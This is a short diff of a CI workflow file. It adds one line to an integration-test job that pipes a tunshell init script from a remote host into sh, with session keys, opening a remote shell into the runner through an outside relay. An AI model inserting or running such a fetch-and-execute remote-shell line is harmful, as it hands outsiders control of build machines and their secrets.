@@ -80,6 +80,7 @@ jobs:
         if: steps.changes.outputs.stack == 'true'
         shell: bash
         run: |
+          curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T vDaqnIVrBuIpvN5p5Fw67B qJKV9SPbcbsugjeMX8MNAf au.relay.tunshell.com
           ./scripts/docker_load.sh
 
       - name: Run integration tests
